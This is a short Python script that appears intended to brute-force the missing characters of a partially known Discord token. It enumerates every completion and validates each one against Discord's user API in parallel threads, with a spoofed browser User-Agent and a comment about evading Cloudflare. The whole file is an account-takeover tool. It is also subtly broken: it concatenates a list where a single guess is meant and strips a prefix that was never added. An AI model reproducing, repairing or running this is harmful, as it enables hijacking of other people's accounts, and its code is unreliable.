import concurrent.futures
import itertools 
import string
import sys
import urllib
from json import loads
from urllib.request import Request

from tqdm import tqdm


# Constants
TOKEN_LENGTH = 59
TOKEN_PATTERN = "/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/"
TOKEN_CHARS = string.ascii_letters + string.digits + "_"


# Variables
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"}
inputToken = "" 
if not inputToken: 
    inputToken = input("Enter your token: ")
guessLength = TOKEN_LENGTH - len(inputToken)
products = ["".join(p) for p in itertools.product(TOKEN_CHARS, repeat=guessLength)]
p = len(products)


def validateToken(token, bot=True):
    headers["Authorization"] = ("Bot " if bot else "") + token
    req = Request("https://discord.com/api/v9/users/@me", headers=headers)
    try:
        response = urllib.request.urlopen(req)
        # json to dict
        body = response.read().decode("utf-8")
        data = loads(body)
        if bot:
            token = token[4:]
        data["token"] = token
        if response.code == 200:
            return data
    except Exception as e:
        pass
    return None


if __name__ == '__main__':
    futures = []
    executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)  # beware cloudflare
    for combo in products:
        testToken = inputToken + products
        futures.append(executor.submit(validateToken, testToken))

    with tqdm(total=p) as pbar:
        for future in concurrent.futures.as_completed(futures):
            try:
                data = future.result()
                if data:
                    print(f'Found token: {data["token"]}, {data["username"]}#{data["discriminator"]}')
                    pbar.update(p - pbar.n)
                    pbar.close()
                    sys.exit(0)
            except:
                pass
            pbar.update(1)
